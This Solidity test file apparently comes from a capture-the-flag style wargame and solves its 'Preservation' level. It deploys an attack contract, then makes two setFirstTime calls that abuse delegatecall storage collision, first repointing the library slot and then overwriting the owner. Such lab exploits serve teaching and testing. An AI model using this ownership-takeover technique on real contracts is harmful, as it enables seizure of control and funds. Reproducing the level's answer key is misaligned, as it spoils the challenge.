// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {LuxTest} from "../Base.t.sol";
import {PreservationFactory} from "../../src/levels/PreservationFactory.sol";
import {Preservation} from "../../src/levels/Preservation.sol";
import {PreservationAttack} from "../../src/attacks/PreservationAttack.sol";

contract PreservationLevel is LuxTest {
    PreservationFactory factory;
    address player = makeAddr("player");

    function setUp() public {
        _deployCore();
        factory = new PreservationFactory();
        _register(factory);
    }

    function test_solve() public {
        address instance = _create(factory, player, 0);
        _assertUnsolved(instance, player);

        // First delegatecall repoints the library to our attacker; the second
        // delegatecalls it to overwrite the owner slot.
        PreservationAttack attack = new PreservationAttack();
        vm.startPrank(player, player);
        Preservation(instance).setFirstTime(uint256(uint160(address(attack))));
        Preservation(instance).setFirstTime(uint256(uint160(player)));
        vm.stopPrank();

        assertEq(Preservation(instance).owner(), player);
        _assertSolved(factory, instance, player);
    }
}
